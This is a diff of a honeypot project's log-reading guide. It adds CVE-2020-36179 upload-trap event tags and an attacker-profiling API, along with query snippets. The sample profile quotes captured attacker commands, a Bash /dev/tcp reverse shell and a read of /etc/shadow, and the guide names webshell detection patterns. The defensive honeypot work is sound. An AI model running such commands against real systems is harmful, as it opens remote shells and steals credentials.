@@ -3,9 +3,10 @@
 Maze Myth writes every event to **two places in parallel**:
 
 | Where | Format | Good for |
-|---|---|---|
+|-------|--------|---------|
 | `log_files/api_audit.log` | Base64-encoded text lines | Tamper-evident archiving |
-| `databases/honeypot.db` → `logs` table | Plain SQL rows | Instant querying, filtering, analysis |
+| `databases/honeypot.db` → `logs` table | Plain SQL rows | Instant querying and filtering |
+| `attacker_intel` (in-memory) | Per-IP session objects | Real-time behavioral analysis |
 
 ---
 
@@ -13,62 +14,123 @@ Maze Myth writes every event to **two places in parallel**:
 
 | Level | Meaning |
 |-------|---------|
-| `INFO` | Normal API access |
-| `WARNING` | Suspicious access (admin endpoints, internal paths) |
-| `CRITICAL` | High-value targets — secrets, credentials, file downloads |
-| `ERROR` | System errors / failed generations |
+| `INFO` | Normal access (form views, safe uploads) |
+| `WARNING` | Suspicious access (dangerous extensions, wrong extensions) |
+| `CRITICAL` | High-value events (webshell upload, webshell execution, beacon fired) |
+| `ERROR` | System errors / failed AI generations |
+
+---
 
 ## Event Tags
 
-The `event` column in the `logs` table contains a short machine-readable tag:
+### API Maze Events
 
 | Tag | Trigger |
-|---|---|
+|-----|---------|
 | `NEW_ENDPOINT_DISCOVERY` | Attacker hits a new path |
 | `FILE_DOWNLOAD` | Attacker downloads a bait file |
 | `BEACON_ACTIVATED` | Attacker opened a bait file (beacon fired) |
 | `AUTH` | Login attempt |
 | `MAZE` | Maze navigation event |
 
+### CVE-2020-36179 Upload Trap Events
+
+| Tag | Trigger | Severity |
+|-----|---------|---------|
+| `CVE_UPLOAD_FORM` | Attacker views Spring upload form | INFO |
+| `CVE_PHP_UPLOAD_FORM` | Attacker views PHP upload form | INFO |
+| `CVE_PHP_UPLOAD_SAFE` | Safe file uploaded (no webshell code) | MEDIUM/WARNING |
+| `CVE_PHP_DANGEROUS_EXT` | Dangerous extension (.php/.jsp/.asp) but no payload | CRITICAL |
+| `CVE_PHP_WEBSHELL_PAYLOAD` | File with real webshell code detected | CRITICAL |
+| `CVE_PHP_WEBSHELL_REGISTERED` | Webshell registered in execution trap | CRITICAL |
+| `CVE_SPRING_WEBSHELL_PAYLOAD` | Same via Spring endpoint | CRITICAL |
+| `CVE_WEBSHELL_HIT` | Attacker executes command via `/uploads/<file>?cmd=` | CRITICAL |
+| `CVE_UPLOAD_PROBE` | Attacker guesses unregistered filename | MEDIUM |
+
 ---
 
-## Option A — Query the SQLite Database (Recommended)
+## Option A — CVE Intelligence API (Easiest)
 
-The `logs` table in `databases/honeypot.db` stores every log in plain text. No decoding needed.
-
-### Open with DB tool
+Real-time attacker profiling — no SQL needed.
 
 ```bash
-# Built-in SQLite CLI
+# Full intelligence dashboard
+curl http://localhost:8001/api/dashboard/cve/file-upload | python3 -m json.tool
+
+# All attacker profiles
+curl http://localhost:8001/api/dashboard/cve/file-upload/attackers | python3 -m json.tool
+
+# Deep profile for one attacker IP
+curl http://localhost:8001/api/dashboard/cve/file-upload/attacker/10.0.0.1 | python3 -m json.tool
+```
+
+**What the deep profile returns:**
+
+```json
+{
+  "ip": "10.0.0.1",
+  "geo": {
+    "country": "Germany", "city": "Frankfurt",
+    "isp": "Hetzner Online GmbH", "is_proxy": false, "is_hosting": true
+  },
+  "current_phase": "POST_EXPLOIT",
+  "phase_label": "🐚  Post-Exploitation",
+  "engagement_score": 87,
+  "commands_run": 14,
+  "webshells_uploaded": 2,
+  "revshell_attempts": 3,
+  "top_commands": [
+    {"cmd": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "risk": 95, "label": "Bash TCP revshell"},
+    {"cmd": "cat /etc/shadow", "risk": 55, "label": "Shadow file read"}
+  ],
+  "uploaded_files": [
+    {"filename": "shell.php", "ext": ".php", "threat_level": "CRITICAL",
+     "patterns": ["PHP_OPENER", "PHP_SYSTEM", "PHP_INPUT_GET"], "has_revshell": false}
+  ],
+  "deception": {
+    "recommendation": "Surface fake cron jobs with root context in ps aux",
+    "deception_hints": ["...", "..."],
+    "tried_revshell": true
+  }
+}
+```
+
+---
+
+## Option B — Query SQLite (Recommended for history)
+
+```bash
 sqlite3 databases/honeypot.db
 ```
 
-### Useful SQL queries
+### Useful SQL Queries
 
 ```sql
--- All logs, newest first
+-- All CVE events, newest first
 SELECT timestamp, level, event, client_ip, message
 FROM logs
+WHERE event LIKE 'CVE_%'
 ORDER BY timestamp DESC
 LIMIT 50;
 
--- Critical events only
+-- All webshell executions
+SELECT timestamp, client_ip, message FROM logs
+WHERE event = 'CVE_WEBSHELL_HIT'
+ORDER BY timestamp DESC;
+
+-- All webshell uploads (real payloads)
+SELECT timestamp, client_ip, message FROM logs
+WHERE event IN ('CVE_PHP_WEBSHELL_PAYLOAD', 'CVE_SPRING_WEBSHELL_PAYLOAD');
+
+-- All CRITICAL events
 SELECT * FROM logs
 WHERE level = 'CRITICAL'
 ORDER BY timestamp DESC;
 
--- All activity from one attacker IP
+-- All activity from one IP
 SELECT * FROM logs
 WHERE client_ip = '10.0.0.1'
 ORDER BY timestamp;
-
--- All file download events
-SELECT timestamp, client_ip, message FROM logs
-WHERE event = 'FILE_DOWNLOAD';
-
--- All beacon activations (file was opened)
-SELECT timestamp, client_ip, message FROM logs
-WHERE event = 'BEACON_ACTIVATED';
 
 -- Count events per type
 SELECT event, COUNT(*) AS total
@@ -77,12 +139,20 @@ WHERE event != ''
 GROUP BY event
 ORDER BY total DESC;
 
--- Count hits per attacker IP
+-- Top attacker IPs by hit count
 SELECT client_ip, COUNT(*) AS hits
 FROM logs
 WHERE client_ip != ''
 GROUP BY client_ip
 ORDER BY hits DESC;
+
+-- File downloads
+SELECT timestamp, client_ip, message FROM logs
+WHERE event = 'FILE_DOWNLOAD';
+
+-- Beacon activations (attacker opened a file)
+SELECT timestamp, client_ip, message FROM logs
+WHERE event = 'BEACON_ACTIVATED';
 ```
 
 ### Query from Python
@@ -93,45 +163,38 @@ import sqlite3
 conn = sqlite3.connect("databases/honeypot.db")
 conn.row_factory = sqlite3.Row
 
-# Last 20 critical events
+# All webshell hits
 rows = conn.execute("""
     SELECT timestamp, level, event, client_ip, message
     FROM logs
-    WHERE level = 'CRITICAL'
+    WHERE event = 'CVE_WEBSHELL_HIT'
     ORDER BY timestamp DESC
     LIMIT 20
 """).fetchall()
 
 for r in rows:
-    print(f"[{r['timestamp']}] {r['level']} | {r['event']} | {r['client_ip']}")
-    print(f"  {r['message']}")
+    print(f"[{r['timestamp']}] {r['client_ip']} | {r['message']}")
 
 conn.close()
 ```
 
-### Via state_manager (from inside the honeypot)
+### Via state_manager (inside honeypot)
 
 ```python
 from src.state import APIStateManager
 state = APIStateManager()
 
-# All logs
-logs = state.get_logs()
-
-# Filtered
 state.get_logs(level='CRITICAL')
-state.get_logs(event='FILE_DOWNLOAD')
+state.get_logs(event='CVE_WEBSHELL_HIT')
 state.get_logs(client_ip='10.0.0.1')
 state.get_logs(level='CRITICAL', limit=50)
 ```
 
 ---
 
-## Option B — Read the Encoded Log File
+## Option C — Read the Encoded Log File
 
 `log_files/api_audit.log` — each line is a Base64-encoded log entry.
-
-### Decode all lines (Python)
 
 ```python
 import base64
@@ -141,66 +204,40 @@ with open("log_files/api_audit.log", "r") as f:
         line = line.strip()
         if line:
             try:
-                print(base64.b64decode(line).decode("utf-8"))
+                decoded = base64.b64decode(line).decode("utf-8")
+                if "CVE_" in decoded:  # filter to CVE events
+                    print(decoded)
             except Exception:
                 pass
 ```
 
-### Decode and filter to CRITICAL only
-
-```python
-import base64
-
-with open("log_files/api_audit.log", "r") as f:
-    for line in f:
-        try:
-            decoded = base64.b64decode(line.strip()).decode("utf-8")
-            if "CRITICAL" in decoded:
-                print(decoded)
-        except Exception:
-            pass
-```
-
-### One-liner (PowerShell)
-
+**PowerShell:**
 ```powershell
 Get-Content log_files\api_audit.log | ForEach-Object {
     [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($_))
-}
+} | Select-String "CVE_"
 ```
 
-### One-liner (Bash/Linux)
-
+**Bash:**
 ```bash
-while IFS= read -r line; do echo "$line" | base64 -d; echo; done < log_files/api_audit.log
+while IFS= read -r line; do
+    echo "$line" | base64 -d
+    echo
+done < log_files/api_audit.log | grep "CVE_"
 ```
 
 ---
 
-## Reading `databases/honeypot.db` — All Tables
-
-The database holds all honeypot state, not just logs.
-
-### Open interactively
+## Reading All Database Tables
 
 ```bash
 sqlite3 databases/honeypot.db
 
-# Show all tables
-.tables
-
-# Show columns of a table
+.tables          # endpoints, objects, beacons, downloads, logs
 .schema logs
-.schema endpoints
-.schema downloads
-.schema beacons
-
-# Pretty print
-.mode column
 .headers on
+.mode column
 ```
-
-### Read all tables (Python)
 
 ```python
 import sqlite3, json
@@ -208,55 +245,44 @@ import sqlite3, json
 conn = sqlite3.connect("databases/honeypot.db")
 conn.row_factory = sqlite3.Row
 
-# All AI-generated endpoints
-endpoints = conn.execute(
-    "SELECT path, method, access_count, created_at FROM endpoints ORDER BY access_count DESC"
-).fetchall()
-for ep in endpoints:
+# AI-generated endpoints (access count = how many times attacker hit same URL)
+for ep in conn.execute("SELECT path, method, access_count FROM endpoints ORDER BY access_count DESC").fetchall():
     print(f"{ep['method']:6} {ep['path']} — {ep['access_count']} hits")
 
 # All downloads
-downloads = conn.execute(
-    "SELECT filename, client_ip, timestamp, is_sensitive FROM downloads ORDER BY timestamp DESC"
-).fetchall()
-for d in downloads:
-    tag = "🔴 SENSITIVE" if d["is_sensitive"] else ""
-    print(f"{d['timestamp']}  {d['client_ip']}  {d['filename']} {tag}")
+for d in conn.execute("SELECT filename, client_ip, timestamp FROM downloads ORDER BY timestamp DESC").fetchall():
+    print(f"{d['timestamp']}  {d['client_ip']}  {d['filename']}")
 
-# Active beacons (fired)
-beacons = conn.execute(
+# Active beacons (opened by attacker)
+for b in conn.execute(
     "SELECT beacon_id, file_name, client_ip, accessed_at, activation_ip FROM beacons WHERE accessed_at IS NOT NULL"
-).fetchall()
-for b in beacons:
-    print(f"BEACON {b['beacon_id'][:8]}  file={b['file_name']}  downloaded_by={b['client_ip']}  opened_from={b['activation_ip']}")
+).fetchall():
+    print(f"BEACON {b['beacon_id'][:8]}  file={b['file_name']}  opened_from={b['activation_ip']}")
 
 conn.close()
 ```
 
 ---
 
-## Using the Dashboard (Easiest)
-
-The dashboard at `http://localhost:8002` reads the same `log_files/api_audit.log` and auto-decodes it in real time. No command line needed.
-
-```bash
-# API access
-curl http://localhost:8002/api/activity   # recent events
-curl http://localhost:8002/api/stats      # counts
-curl http://localhost:8002/api/downloads  # file downloads
-curl http://localhost:8002/api/sensitive  # sensitive downloads only
-```
-
----
-
 ## High-Value CRITICAL Triggers
 
+### API Maze
+
 | Access | Endpoint |
-|---|---|
+|--------|---------|
 | Admin secrets | `/api/v2/admin/secrets` |
 | API credentials | `/companies/*/apiCredentials` |
 | Internal config | `/internal/config/*` |
 | Database config | `/internal/config/database` |
 | Backups | `/internal/backups` |
 
-Sensitive file download keywords: `credential`, `secret`, `key`, `password`, `backup`, `config`, `db`, `sqlite`
+### CVE Upload Trap
+
+| Action | Severity |
+|--------|---------|
+| View upload form | INFO |
+| Upload safe file | MEDIUM |
+| Upload file with dangerous extension only | CRITICAL |
+| Upload file with webshell code | CRITICAL |
+| Execute any `?cmd=` | CRITICAL |
+| Attempt reverse shell | CRITICAL |
